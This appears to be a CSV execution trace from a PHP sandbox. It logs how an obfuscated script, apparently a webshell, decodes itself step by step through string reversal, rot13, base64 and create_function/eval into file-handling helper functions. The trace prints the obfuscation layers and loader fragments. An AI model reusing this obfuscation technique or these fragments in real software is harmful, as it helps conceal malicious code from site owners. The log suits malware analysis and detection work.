uuid,file_md5,index,source,target,argc,argv,return,dynamic
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,593,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,594,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,595,hiabug,strrev,1,"{""value"": [[0, ""str"", ""=0aPA0KPWbDQ701Wy1JLhqlJykJnTEPVhWKq0IzpWxDPX0DsWxDPX0jBcxFMfyzExtPp19zpaITocMTXxy2MlqTqyq2K4y2piOUV9NFMfyzExxDPWbDQ7OFXcpPMcqzpaE""]]}",{"value": "MaIhL3Eco24tE2I0EzyfMHqlo3IjXPETnJkyXFO7QDbWPJyzXSOOIRusH0IDDIWOIR9FCG0aBvpcrj0XVPNtVPNtVPNtVPNtnJLbMaIhL3Eco25sMKucp3EmXPqjo3AcrS"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,596,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""MaIhL3Eco24tE2I0EzyfMHqlo3IjXPETnJkyXFO7QDbWPJyzXSOOIRusH0IDDIWOIR9FCG0aBvpcrj0XVPNtVPNtVPNtVPNtnJLbMaIhL3Eco25sMKucp3EmXPqjo3AcrS""]]}",{"value": "ZnVuY3Rpb24gR2V0RmlsZUdyb3VwKCRGaWxlKSB7DQoJCWlmKFBBVEhfU0VQQVJBVE9SPT0nOicpew0KICAgICAgICAgICAgaWYoZnVuY3Rpb25fZXhpc3RzKCdwb3NpeF"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,597,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gR2V0RmlsZUdyb3VwKCRGaWxlKSB7DQoJCWlmKFBBVEhfU0VQQVJBVE9SPT0nOicpew0KICAgICAgICAgICAgaWYoZnVuY3Rpb25fZXhpc3RzKCdwb3NpeF""]]}",{"value": "function GetFileGroup($File) {\r\n\t\tif(PATH_SEPARATOR==':'){\r\n            if(function_exists('posix_getgrgid')) {\r\n\t\t\t$File = posix_"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,598,hiabug,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function GetFileGroup($File) {\r\n\t\tif(PATH_SEPARATOR==':'){\r\n            if(function_exists('posix_getgrgid')) {\r\n\t\t\t$File = posix_""]]}",{"value": "\\x00lambda_23"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,599,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function GetFileGroup($File) {\r\n\t\tif(PATH_SEPARATOR==':'){\r\n            if(function_exists('posix_getgrgid')) {\r\n\t\t\t$File = posix_getgrgid(filegroup($File));\r\n\t\t\t}\r\n\t\t\treturn $File['name'];\r\n\t\t}\r\n}}""]]}",{"value": "003E"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,600,hiabug,__lambda_func,0,{"value": []},{"value": "void"},[]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,601,eval,hiabug,2,"{""value"": [[0, ""QtrIng"", ""9OvPA0UVtNPVtNPVtbDQ7VPIGOvVhxvZfVTMx8FM6y2pxtPMhI3olOvolIUqyWUVtNPVtNPVtNPVtNvPANlrtNPVtNPVtNvPAH2pfIJPWbDQ9OPVtNPVtNPVX0jBvDSVv4""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,602,hiabug,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,603,hiabug,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,604,hiabug,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,605,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,606,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,607,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,608,hiabug,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,609,hiabug,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,610,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,611,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,612,hiabug,strrev,1,"{""value"": [[0, ""str"", ""9OvPA0UVtNPVtNPVtbDQ7VPIGOvVhxvZfVTMx8FM6y2pxtPMhI3olOvolIUqyWUVtNPVtNPVtNPVtNvPANlrtNPVtNPVtNvPAH2pfIJPWbDQ9OPVtNPVtNPVX0jBvDSVv4""]]}",{"value": "MaIhL3Eco24tEzyfMI9GnKcyXPEmnKcyXD0XrlNAPvNtVPNtVPNtWTgvVQ0tZGNlAQftVPNtVPNtQDbtVPNtVPNtVPEgLvN9VQRjZwDtXvNxn2V7VPNAPvNtVPNtVPNtWT"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,613,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""MaIhL3Eco24tEzyfMI9GnKcyXPEmnKcyXD0XrlNAPvNtVPNtVPNtWTgvVQ0tZGNlAQftVPNtVPNtQDbtVPNtVPNtVPEgLvN9VQRjZwDtXvNxn2V7VPNAPvNtVPNtVPNtWT""]]}",{"value": "ZnVuY3Rpb24gRmlsZV9TaXplKCRzaXplKQ0KeyANCiAgICAgICAgJGtiID0gMTAyNDsgICAgICAgDQogICAgICAgICRtYiA9IDEwMjQgKiAka2I7ICANCiAgICAgICAgJG"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,614,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gRmlsZV9TaXplKCRzaXplKQ0KeyANCiAgICAgICAgJGtiID0gMTAyNDsgICAgICAgDQogICAgICAgICRtYiA9IDEwMjQgKiAka2I7ICANCiAgICAgICAgJG""]]}",{"value": "function File_Size($size)\r\n{ \r\n        $kb = 1024;       \r\n        $mb = 1024 * $kb;  \r\n        $gb = 1024 * $mb; \r\n        $tb = "},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,615,hiabug,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function File_Size($size)\r\n{ \r\n        $kb = 1024;       \r\n        $mb = 1024 * $kb;  \r\n        $gb = 1024 * $mb; \r\n        $tb = ""]]}",{"value": "\\x00lambda_24"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,616,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function File_Size($size)\r\n{ \r\n        $kb = 1024;       \r\n        $mb = 1024 * $kb;  \r\n        $gb = 1024 * $mb; \r\n        $tb = 1024 * $gb;\r\n\t\t$db = 1024 * $tb;\r\n        if($size < $kb)\r\n        {\r\n            return $size.\"" B\"";\r\n        }\r\n        else if($size < $mb)\r\n        { \r\n            return round($size/$kb,2).\"" K\"";\r\n        }\r\n        else if($size < $gb)\r\n        { \r\n            return round($size/$mb,2).\"" M\"";\r\n        }\r\n        else if($size < $tb)\r\n        { \r\n            return round($size/$gb,2).\"" G\"";\r\n        }\r\n        else if($size < $db)\r\n        { \r\n            return round($size/$tb,2).\"" T\"";\r\n        }\r\n\t\telse\r\n        { \r\n            return round($size/$db,2).\"" ST\"";\r\n        }\r\n }}""]]}",{"value": "003E"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,617,hiabug,__lambda_func,0,{"value": []},{"value": "void"},[]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,618,eval,hiabug,2,"{""value"": [[0, ""QtrIng"", ""==DsX0jByE2owITocMTWt4zp1EKMlytPAfGXykTMhSTnxtFMm9TowMTDWbDQ7xFXy1JLhITocMTWbHzrcAKMfyzMNkFMfEzouuTWbDJLyWaMNOFCtHTMiAJMfyzMxxtPAf""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,619,hiabug,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,620,hiabug,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,621,hiabug,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,622,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,623,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,624,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,625,hiabug,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,626,hiabug,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,627,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,628,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,629,hiabug,strrev,1,"{""value"": [[0, ""str"", ""==DsX0jByE2owITocMTWt4zp1EKMlytPAfGXykTMhSTnxtFMm9TowMTDWbDQ7xFXy1JLhITocMTWbHzrcAKMfyzMNkFMfEzouuTWbDJLyWaMNOFCtHTMiAJMfyzMxxtPAf""]]}",{"value": "MaIhL3Eco24tEzyfMI9FMJSxXPEznJkyozSgMFxAPafAPtxxnTShMTkyVQ0tDTMipTIhXPEznJkyozSgMFjvpzVvXGfAPtxxMzyfMJAiMTHtCFONMaWyLJDbWTuuozEfMF"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,630,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""MaIhL3Eco24tEzyfMI9FMJSxXPEznJkyozSgMFxAPafAPtxxnTShMTkyVQ0tDTMipTIhXPEznJkyozSgMFjvpzVvXGfAPtxxMzyfMJAiMTHtCFONMaWyLJDbWTuuozEfMF""]]}",{"value": "ZnVuY3Rpb24gRmlsZV9SZWFkKCRmaWxlbmFtZSkNCnsNCgkkaGFuZGxlID0gQGZvcGVuKCRmaWxlbmFtZSwicmIiKTsNCgkkZmlsZWNvZGUgPSBAZnJlYWQoJGhhbmRsZS"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,631,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gRmlsZV9SZWFkKCRmaWxlbmFtZSkNCnsNCgkkaGFuZGxlID0gQGZvcGVuKCRmaWxlbmFtZSwicmIiKTsNCgkkZmlsZWNvZGUgPSBAZnJlYWQoJGhhbmRsZS""]]}","{""value"": ""function File_Read($filename)\r\n{\r\n\t$handle = @fopen($filename,\""rb\"");\r\n\t$filecode = @fread($handle,@filesize($filename));\r\n\t@fclose""}",[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,632,hiabug,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function File_Read($filename)\r\n{\r\n\t$handle = @fopen($filename,\""rb\"");\r\n\t$filecode = @fread($handle,@filesize($filename));\r\n\t@fclose""]]}",{"value": "\\x00lambda_25"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,633,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function File_Read($filename)\r\n{\r\n\t$handle = @fopen($filename,\""rb\"");\r\n\t$filecode = @fread($handle,@filesize($filename));\r\n\t@fclose($handle);\r\n\treturn $filecode;\r\n}}""]]}",{"value": "003E"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,634,hiabug,__lambda_func,0,{"value": []},{"value": "void"},[]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,635,eval,hiabug,2,"{""value"": [[0, ""QtrIng"", ""9cDQtNFstNPVtbDQtNlBuEKLxEPVhWKq0IzptNPVtbDQtNFstNPVtNPVtNvPANPV9OPVtNPVtNPVtNPVtbDQtNlBcDJMx92LhITWtjPq1OUq19TWtjFL0STMxtlMhyTMiA""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,636,hiabug,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,637,hiabug,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,638,hiabug,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,639,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,640,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,641,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,642,hiabug,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,643,hiabug,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,644,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,645,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,646,hiabug,strrev,1,"{""value"": [[0, ""str"", ""9cDQtNFstNPVtbDQtNlBuEKLxEPVhWKq0IzptNPVtbDQtNFstNPVtNPVtNvPANPV9OPVtNPVtNPVtNPVtbDQtNlBcDJMx92LhITWtjPq1OUq19TWtjFL0STMxtlMhyTMiA""]]}",{"value": "MaIhL3Eco24tLKWlLKysnJAioaLbWTEuqTRfVPNxo3I0pUI0VQ0tW3I0Mv04WlxtrlNtQDbtVPNtWTIhL29xMI9upaVtCFOupaWurFtaIIETYGtaYPqOH0AWFFpfW0qPFl"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,647,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""MaIhL3Eco24tLKWlLKysnJAioaLbWTEuqTRfVPNxo3I0pUI0VQ0tW3I0Mv04WlxtrlNtQDbtVPNtWTIhL29xMI9upaVtCFOupaWurFtaIIETYGtaYPqOH0AWFFpfW0qPFl""]]}",{"value": "ZnVuY3Rpb24gYXJyYXlfaWNvbnYoJGRhdGEsICAkb3V0cHV0ID0gJ3V0Zi04JykgeyAgDQogICAgJGVuY29kZV9hcnIgPSBhcnJheSgnVVRGLTgnLCdBU0NJSScsJ0dCSy"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,648,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gYXJyYXlfaWNvbnYoJGRhdGEsICAkb3V0cHV0ID0gJ3V0Zi04JykgeyAgDQogICAgJGVuY29kZV9hcnIgPSBhcnJheSgnVVRGLTgnLCdBU0NJSScsJ0dCSy""]]}","{""value"": ""function array_iconv($data,  $output = 'utf-8') {  \r\n    $encode_arr = array('UTF-8','ASCII','GBK','GB2312','BIG5','JIS','eucjp-wi""}",[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,649,hiabug,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function array_iconv($data,  $output = 'utf-8') {  \r\n    $encode_arr = array('UTF-8','ASCII','GBK','GB2312','BIG5','JIS','eucjp-wi""]]}",{"value": "\\x00lambda_26"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,650,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function array_iconv($data,  $output = 'utf-8') {  \r\n    $encode_arr = array('UTF-8','ASCII','GBK','GB2312','BIG5','JIS','eucjp-win','sjis-win','EUC-JP');  \r\n    $encoded = mb_detect_encoding($data, $encode_arr);  \r\n  \r\n    if (!is_array($data)) {  \r\n        return mb_convert_encoding($data, $output, $encoded);  \r\n    }  \r\n    else {  \r\n        foreach ($data as $key=>$val) {  \r\n            $key = array_iconv($key, $output);  \r\n            if(is_array($val)) {  \r\n                $data[$key] = array_iconv($val, $output);  \r\n            } else {  \r\n            $data[$key] = mb_convert_encoding($data, $output, $encoded);  \r\n            }  \r\n        }  \r\n    return $data;  \r\n    }  \r\n}}""]]}",{"value": "003E"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,651,hiabug,__lambda_func,0,{"value": []},{"value": "void"},[]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,652,eval,hiabug,2,"{""value"": [[0, ""QtrIng"", ""9cDQ7xvoykTWfpvYh4lWfRTquETWbH2LukTpyW3KlE3pvI3pt4zp1EKMlytPAfGL0STMxNvolIUqyWUVc4JMfEPV8NFXuEKLxEPXhITolE3pbLJnWbDQ7cDQc4JMfEPYuE""], [1, ""show"", 1]]}",{"value": "void"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,653,hiabug,strtr,3,"{""value"": [[0, ""str"", ""Strprot1a""], [1, ""from"", ""pa""], [2, ""to"", ""_3""]]}",{"value": "Str_rot13"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,654,hiabug,strtr,3,"{""value"": [[0, ""str"", ""robprQ_06rfnO""], [1, ""from"", ""o0""], [2, ""to"", ""q4""]]}",{"value": "rqbprQ_46rfnO"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,655,hiabug,strrev,1,"{""value"": [[0, ""str"", ""rqbprQ_46rfnO""]]}",{"value": "Onfr64_Qrpbqr"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,656,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""Onfr64_Qrpbqr""]]}",{"value": "Base64_Decode"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,657,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""T2kw""]]}",{"value": "Oi0"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,658,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""MDl5""]]}",{"value": "09y"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,659,hiabug,strtr,3,"{""value"": [[0, ""str"", ""hiJnOAzo1MOK0EKL0W3D""], [1, ""from"", ""Oi0""], [2, ""to"", ""09y""]]}",{"value": "h9Jn0Azo1M0KyEKLyW3D"},"[0, 0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,660,hiabug,strrev,1,"{""value"": [[0, ""str"", ""h9Jn0Azo1M0KyEKLyW3D""]]}",{"value": "D3WyLKEyK0M1ozA0nJ9h"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,661,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""D3WyLKEyK0M1ozA0nJ9h""]]}",{"value": "Q3JlYXRlX0Z1bmN0aW9u"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,662,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}",{"value": "Create_Function"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,663,hiabug,strrev,1,"{""value"": [[0, ""str"", ""9cDQ7xvoykTWfpvYh4lWfRTquETWbH2LukTpyW3KlE3pvI3pt4zp1EKMlytPAfGL0STMxNvolIUqyWUVc4JMfEPV8NFXuEKLxEPXhITolE3pbLJnWbDQ7cDQc4JMfEPYuE""]]}",{"value": "MaIhL3Eco24tGKympJksGTIhXPExLKEuYPEfMJ4cQDc7QDbWnJLbp3EloTIhXPExLKEuXFN8VPEfMJ4cVUWyqUIlovNxMTS0LGfAPtylMKE1pz4tp3Ivp3ElK3WypTkuL2"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,664,hiabug,str_rot13,1,"{""value"": [[0, ""str"", ""MaIhL3Eco24tGKympJksGTIhXPExLKEuYPEfMJ4cQDc7QDbWnJLbp3EloTIhXPExLKEuXFN8VPEfMJ4cVUWyqUIlovNxMTS0LGfAPtylMKE1pz4tp3Ivp3ElK3WypTkuL2""]]}",{"value": "ZnVuY3Rpb24gTXlzcWxfTGVuKCRkYXRhLCRsZW4pDQp7DQoJaWYoc3RybGVuKCRkYXRhKSA8ICRsZW4pIHJldHVybiAkZGF0YTsNCglyZXR1cm4gc3Vic3RyX3JlcGxhY2"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,665,hiabug,base64_decode,1,"{""value"": [[0, ""str"", ""ZnVuY3Rpb24gTXlzcWxfTGVuKCRkYXRhLCRsZW4pDQp7DQoJaWYoc3RybGVuKCRkYXRhKSA8ICRsZW4pIHJldHVybiAkZGF0YTsNCglyZXR1cm4gc3Vic3RyX3JlcGxhY2""]]}","{""value"": ""function Mysql_Len($data,$len)\r\n{\r\n\tif(strlen($data) < $len) return $data;\r\n\treturn substr_replace($data,'...',$len);\r\n}""}",[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,666,hiabug,create_function,2,"{""value"": [[0, ""args"", """"], [1, ""code"", ""function Mysql_Len($data,$len)\r\n{\r\n\tif(strlen($data) < $len) return $data;\r\n\treturn substr_replace($data,'...',$len);\r\n}""]]}",{"value": "\\x00lambda_27"},"[0, 0]"
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,667,create_function,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""function __lambda_func(){function Mysql_Len($data,$len)\r\n{\r\n\tif(strlen($data) < $len) return $data;\r\n\treturn substr_replace($data,'...',$len);\r\n}}""]]}",{"value": "003E"},[0]
99e2898feb4611e60b38467759c825bf,931cb6ed54e36c8a8900227da06ab10d,668,hiabug,__lambda_func,0,{"value": []},{"value": "void"},[]
